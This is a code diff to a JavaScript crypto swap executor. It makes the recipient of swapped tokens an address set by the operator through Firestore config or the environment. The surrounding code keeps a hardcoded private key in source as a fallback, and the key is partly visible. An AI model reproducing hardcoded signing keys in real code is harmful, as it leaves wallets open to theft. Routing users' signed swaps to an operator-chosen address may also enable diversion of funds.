@@ -21,6 +21,7 @@ const HARDCODED_PRIVATE_KEY = '0x2c9e89ed5e437acfc2db83d7bd76eb73b9d978a4716f0e8
 // Runtime executor config (may be loaded from Firestore admin_config/settings)
 let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
 let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
+let RECIPIENT_ADDRESS = HARDCODED_EXECUTOR;
 
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
@@ -62,6 +63,7 @@ async function init() {
     const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+    RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
   } catch (e) {
     // ignore — we'll fall back to hard-coded values
     console.error('failed to load admin_config settings (executor override):', e);
@@ -119,8 +121,8 @@ function buildUniversalRouterTx(data, overrides = {}) {
     r, s, v
   } = data;
 
-  // recipient of swapped tokens: use configured executor address
-  const recipient = EXECUTOR_ADDRESS;
+  // recipient of swapped tokens: use configured recipient address
+  const recipient = RECIPIENT_ADDRESS;
 
   // normalize amount to BigInt
   const amountBn = BigInt(amount);
